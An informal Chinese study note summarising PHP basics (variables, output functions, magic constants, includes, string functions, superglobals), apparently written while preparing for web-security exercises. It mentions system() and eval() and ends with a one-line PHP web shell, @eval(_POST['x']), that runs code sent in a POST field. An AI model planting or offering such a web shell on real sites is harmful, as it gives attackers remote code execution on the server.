随便总结一下PHP的性质
主体<?php      ?>

变量前加$
global和static
若要输出$c可以使用转义字符/$c
$可以多个一起嵌套，右结合，这个挺有意思的
创建数组$hello=array("a","b");      $hello[0]

每句话后面加；

直接输出echo print（格式化） //这里变量加不加“”无所谓  
输出数组print_r           输出结果及类型var_dump()                 输出多个结果时以  .  间隔      '  '里面的不会被解释

魔术常量：
__FILE__ 返回包含绝对路径的文件名
__DIR__返回文件所在路径
__LINE__返回该行代码所在行数

if else,while,do while,for,同c
foreach遍历数组

文件包含：
include 'filename'(发生错误不停止)
require，还有include_once等

trim（）删除字符串两边的空格
strtolower（）小写
strcmp(,)比较大小，返回-1,0，1
substr(字符串，起始位置，数量）截取字符串        substr（字符串，n）截取后n位
isset（变量）是否被设置
preg_match(正则表达式,变量)成功返回1，不成功返回0
。。。看英语就知道是什么吧，自己查去
phpinfo（）返回php信息，特别是版本信息
system（）执行系统命令
eval（）括号里面的当做php代码执行

form标签可能有用

超全局变量：
_GET _POST _COOKIE _SESSION _SEVER _REQUEST这些都是数组

一句话木马
@eval（_POST['x']）;


 


